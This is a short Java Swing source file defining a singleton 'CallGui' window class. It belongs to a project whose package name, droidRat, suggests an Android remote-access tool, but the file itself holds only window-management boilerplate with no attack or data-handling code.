package com.je_chen.droidRat.gui.callgui;

import com.je_chen.droidRat.gui.guisuper.GuiFather;
import com.je_chen.droidRat.gui.guisuper.GuiFatherInterface;

import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class CallGui extends GuiFather implements GuiFatherInterface {
    private static CallGui Instance;
    private JPanel jPanel;

    public static synchronized CallGui getInstance(String windowName) {
        if (Instance == null) {
            Instance = new CallGui();
            Instance.show(windowName);
        }
        return Instance;
    }

    @Override
    protected void closeEvent() {
        super.closeEvent();
        instance = null;
    }
}
